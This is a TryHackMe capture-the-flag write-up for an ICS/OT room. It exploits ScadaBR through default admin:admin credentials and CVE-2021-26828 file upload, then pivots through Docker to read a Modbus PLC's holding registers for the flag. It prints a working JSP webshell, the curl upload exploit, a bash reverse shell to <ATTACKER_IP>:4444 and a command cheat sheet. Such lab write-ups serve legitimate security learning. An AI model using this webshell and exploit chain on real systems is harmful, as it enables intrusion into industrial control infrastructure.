@@ -1,0 +1,307 @@
+# Brr — TryHackMe Writeup
+
+**Platform:** TryHackMe
+**Room:** Brr
+**Category:** ICS/OT
+**Target:** Docker containers running ScadaBR + a Modbus PLC
+
+---
+
+## Overview
+
+This room is different from most THM boxes. There's no `user.txt` sitting in `/home`, no obvious privesc path. It's an ICS/OT room built around ScadaBR and a Modbus PLC, and you have to actually talk to industrial hardware to get the flag. That took me a while to figure out.
+
+Attack chain:
+
+1. Recon — find ScadaBR on port 8080
+2. Login with `admin:admin`
+3. Exploit CVE-2021-26828 → JSP webshell → reverse shell
+4. Pivot through Docker networking to reach the PLC at `plc:5020`
+5. Read holding registers via Modbus TCP to get the flag
+
+---
+
+## Reconnaissance
+
+```bash
+rustscan -a <TARGET_IP> --range 1-65535 --ulimit 5000 -- -sV -sC -Pn
+```
+
+Open ports:
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 22   | SSH | Not initial access |
+| 80   | WebSockify | noVNC proxy |
+| 5020 | Modbus TCP | The PLC |
+| 5901 | VNC | Remote desktop |
+| 8080 | Apache Tomcat | ScadaBR web app |
+
+The page title on port 8080 said "ScadaBR CTF". Not subtle.
+
+---
+
+## Web enumeration
+
+`/` redirects to `/ScadaBR`, which JS-redirects to `login.htm`. Standard login form with `username` and `password` fields.
+
+```bash
+curl -i -L http://<TARGET_IP>:8080/ScadaBR/login.htm
+```
+
+---
+
+## Initial access
+
+ScadaBR is famous for shipping with default credentials.
+
+```bash
+curl -i -c cookies.txt -b cookies.txt -L \
+  -d "username=admin&password=admin" \
+  http://<TARGET_IP>:8080/ScadaBR/login.htm
+```
+
+Got a `302` to `watch_list.shtm` and a valid `JSESSIONID`. Logged in.
+
+The Data Sources page showed the app was talking to a PLC:
+
+| Field | Value |
+|-------|-------|
+| Name | `secret` |
+| Type | Modbus IP |
+| Host | `plc` |
+| Port | `5020` |
+| Slave ID | 1 |
+| Point | Binary, offset 0/0 |
+
+That confirmed this was an OT room, not a normal web box.
+
+---
+
+## CVE-2021-26828 — arbitrary file upload
+
+ScadaBR's graphical views feature lets you upload a background image through `view_edit.shtm`. The version in this room doesn't validate file extensions, so you can drop a JSP straight into the Tomcat webroot.
+
+### The webshell
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+  String cmd = request.getParameter("cmd");
+  if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
+    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = in.readLine()) != null) {
+      out.println(line);
+    }
+  }
+%>
+```
+
+### Upload it
+
+```bash
+curl -i -b cookies.txt -X POST \
+  -F "view.name=pwn" \
+  -F "view.xid=GV_pwn" \
+  -F "backgroundImageMP=@brr.jsp;type=application/octet-stream" \
+  -F "upload=Upload image" \
+  http://<TARGET_IP>:8080/ScadaBR/view_edit.shtm
+```
+
+The response HTML contained the upload path:
+
+```html
+<img id="viewBackground" src="uploads/1.jsp" ... />
+```
+
+### Verify
+
+```bash
+curl -i "http://<TARGET_IP>:8080/ScadaBR/uploads/1.jsp?cmd=id"
+```
+
+```
+uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
+```
+
+Code execution as `tomcat7`. Notice `dialout` in the groups — that's the group that owns serial devices.
+
+---
+
+## Reverse shell
+
+URL-encode the payload so it fits in a query string:
+
+```bash
+python3 - <<'EOF'
+import urllib.parse
+payload = "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
+print(urllib.parse.quote(payload))
+EOF
+```
+
+Listen:
+
+```bash
+nc -lvnp 4444
+```
+
+Trigger:
+
+```bash
+curl "http://<TARGET_IP>:8080/ScadaBR/uploads/1.jsp?cmd=<ENCODED_PAYLOAD>"
+```
+
+Shell:
+
+```
+tomcat7@77f992b1ebf5:/var/lib/tomcat7$
+```
+
+**Note:** If the shell hangs, check where your VPN is running. If it's on your host instead of inside the Kali VM, the target will call back to the host's VPN IP where nothing is listening. Move the VPN into the VM.
+
+---
+
+## Inside the container
+
+The hostname and `/.dockerenv` confirmed this was a Docker container. IP was `172.20.0.3` on a `/16` bridge.
+
+```bash
+getent hosts plc
+# 172.20.0.2      plc
+```
+
+So the PLC is a sibling container on the same Docker network. That's why ScadaBR could reach it, and why we can too.
+
+No flag files on the filesystem:
+
+```bash
+find / -name "*flag*" -o -name "user.txt" -o -name "root.txt" 2>/dev/null
+```
+
+Nothing useful. The flag has to be on the PLC.
+
+No `pymodbus`, `nc`, `ncat`, or `socat` in the container, but Python 3 is there. That's enough — Modbus TCP is simple enough to speak with raw sockets.
+
+---
+
+## Modbus TCP
+
+Frame format:
+
+```
+[Transaction ID: 2B][Protocol: 2B = 0x0000][Length: 2B][Unit ID: 1B][Function: 1B][Data: NB]
+```
+
+Function codes:
+
+- `0x01` read coils
+- `0x02` read discrete inputs
+- `0x03` read holding registers
+- `0x04` read input registers
+
+### Warm-up — read coils
+
+```python
+import socket, struct
+pdu = struct.pack(">BHH", 0x01, 0, 8)
+hdr = struct.pack(">HHHB", 1, 0, len(pdu)+1, 1)
+s = socket.socket(); s.settimeout(5); s.connect(("plc", 5020))
+s.sendall(hdr + pdu)
+print(s.recv(1024).hex())
+```
+
+Response: `010100` — function code, byte count, and a byte of zeros. All coils off. Works, but nothing interesting.
+
+### Read holding registers
+
+```python
+def modbus_read(unit, func, start, count, txid=1):
+    s = socket.socket(); s.settimeout(5); s.connect(("plc", 5020))
+    pdu = struct.pack(">BHH", func, start, count)
+    header = struct.pack(">HHHB", txid, 0, len(pdu)+1, unit)
+    s.sendall(header + pdu)
+    resp = s.recv(7)
+    r_txid, r_proto, r_len, r_unit = struct.unpack(">HHHB", resp)
+    body = b""
+    while len(body) < r_len - 1:
+        body += s.recv(r_len - 1 - len(body))
+    s.close()
+    return body
+
+print(modbus_read(1, 0x03, 0, 20).hex())
+```
+
+Response:
+
+```
+032800540048004d007b006d006f0064006200750073005f006800690064007d00...
+```
+
+Each holding register is two bytes, big-endian, with the ASCII value packed into the low byte. Strip the header (`03 28`) and read the low byte of every pair:
+
+```
+54 48 4d 7b 6d 6f 64 62 75 73 5f 68 69 64 7d
+T  H  M  {  m  o  d  b  u  s  _  h  i  d  }
+```
+
+### Flag
+
+```
+THM{modbus_hid}
+```
+
+---
+
+## Attack flow
+
+```
+Attacker → ScadaBR :8080 → CVE-2021-26828 → shell as tomcat7 in container
+   ↓
+container 172.20.0.3 → Docker DNS → plc 172.20.0.2:5020
+   ↓
+Modbus TCP read holding registers → THM{modbus_hid}
+```
+
+---
+
+## Takeaways
+
+A few things worth remembering:
+
+- ScadaBR and plenty of other SCADA/HMI software still ships with `admin:admin`. Try defaults before reaching for an exploit.
+- CVE-2021-26828 — the upload endpoint on `view_edit.shtm` doesn't validate extensions, so anything Tomcat can execute lands in the webroot.
+- Once you land in a container, `getent hosts <name>` and `/etc/hosts` tell you what sibling containers exist. Docker's embedded DNS resolves service names on the same bridge.
+- Modbus TCP doesn't need a library. `struct` plus `socket` is enough to read and write registers. If you're going to do more OT work, learn the function codes and the register/coil distinction.
+- The `dialout` group on a Linux user is almost always a sign that serial or industrial devices are reachable.
+
+---
+
+## Command cheat sheet
+
+```bash
+# Scan
+rustscan -a $IP --range 1-65535 --ulimit 5000 -- -sV -sC -Pn
+
+# Login
+curl -i -c cookies.txt -b cookies.txt -L \
+  -d "username=admin&password=admin" \
+  http://$IP:8080/ScadaBR/login.htm
+
+# Upload webshell
+curl -i -b cookies.txt -X POST \
+  -F "view.name=pwn" \
+  -F "view.xid=GV_pwn" \
+  -F "backgroundImageMP=@brr.jsp;type=application/octet-stream" \
+  -F "upload=Upload image" \
+  http://$IP:8080/ScadaBR/view_edit.shtm
+
+# Execute
+curl "http://$IP:8080/ScadaBR/uploads/1.jsp?cmd=id"
+
+# Reverse shell
+nc -lvnp 4444
+curl "http://$IP:8080/ScadaBR/uploads/1.jsp?cmd=<ENCODED_PAYLOAD>"
+```
